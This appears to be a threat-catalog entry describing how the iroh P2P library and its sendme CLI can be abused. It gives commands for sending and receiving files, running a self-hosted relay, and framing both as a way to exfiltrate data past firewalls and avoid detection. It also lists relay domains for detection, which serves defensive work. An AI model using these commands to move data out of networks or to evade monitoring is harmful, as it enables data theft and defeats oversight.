---
Name: iroh
Description: iroh is a P2P networking library by n0-computer. Devices connect by public key over QUIC, hole-punch through NATs and firewalls, and fall back to relay servers when direct connections fail. Traffic is end-to-end encrypted, so relay operators and TLS inspection appliances cannot read it. The sendme CLI transfers files over iroh, and the iroh-relay binary can be self-hosted via Docker. iroh's website promotes it as a replacement for third-party VPNs.
Author: cyberbuff
Created: 2026-10-10
Commands:
  - Command: cargo install sendme && sendme send <file>
    Description: Installs sendme and sends a file. Outputs a ticket the receiver uses to download it over an encrypted P2P connection.
    Usecase: Exfiltrating files over an encrypted P2P tunnel that bypasses NATs and firewalls.
    Category: Exfiltration
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
  - Command: sendme receive <ticket>
    Description: Downloads a file using a ticket from the sender over an encrypted P2P connection with NAT traversal.
    Usecase: Pulling exfiltrated data onto an attacker-controlled host.
    Category: Download
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
  - Command: docker run -d -p 443:443 -p 3478:3478/udp n0computer/iroh-relay
    Description: Runs an iroh relay server in Docker on port 443 (HTTPS) and 3478/udp (STUN for NAT traversal).
    Usecase: Running a self-hosted relay to avoid detection on default n0.computer domains.
    Category: Install
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Custom_Domain_Supported: True
Full_Path:
  - Filename: sendme
  - Filename: iroh-relay
Detection:
  - Domain: use1-1.relay.n0.iroh.link
  - Domain: usw1-1.relay.n0.iroh.link
  - Domain: euc1-1.relay.n0.iroh.link
  - Domain: aps1-1.relay.n0.iroh.link
  - Domain: dns.iroh.link
Resources:
  - Link: https://github.com/n0-computer/iroh
  - Link: https://www.iroh.computer
  - Link: https://github.com/n0-computer/sendme
  - Link: https://hub.docker.com/r/n0computer/iroh-relay
Acknowledgement:
  - Person: cyberbuff
---
